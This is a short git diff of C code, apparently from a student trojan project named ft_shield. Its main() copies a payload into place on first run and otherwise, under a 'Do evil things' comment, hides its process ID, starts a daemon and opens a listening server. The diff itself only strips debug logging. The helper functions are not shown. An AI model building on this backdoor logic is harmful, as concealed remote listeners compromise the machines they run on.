@@ -9,6 +9,7 @@ int main ( void )
     // check where is it executed
     int i = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
     buf[i] = '\0';
+
     if (strcmp(buf, EXECUTABLE_FILE)) {
         printf("robrodri & jalvarad.\n");
         copy_payload(buf);
@@ -18,14 +19,9 @@ int main ( void )
         printf("Setup done.\n");
     }
     else { // Do evil things
-        system("echo aqui_estoy > /home/ubuntu/ft_shield/loggerfile.txt");
-        fprintf(debug_fp, "Inicio del programa.\n"); //TODO DELETE
         hide_pid();
-        fprintf(debug_fp, "PID ocultado.\n"); //TODO DELETE
         t_daemon *daemon = create_daemon();
-        fprintf(debug_fp, "Daemon creado.\n"); //TODO DELETE
         server_listen(daemon);
-        fprintf(debug_fp, "Escuchando.\n"); //TODO DELETE
         free(daemon);
     }
     return (EXIT_SUCCESS);
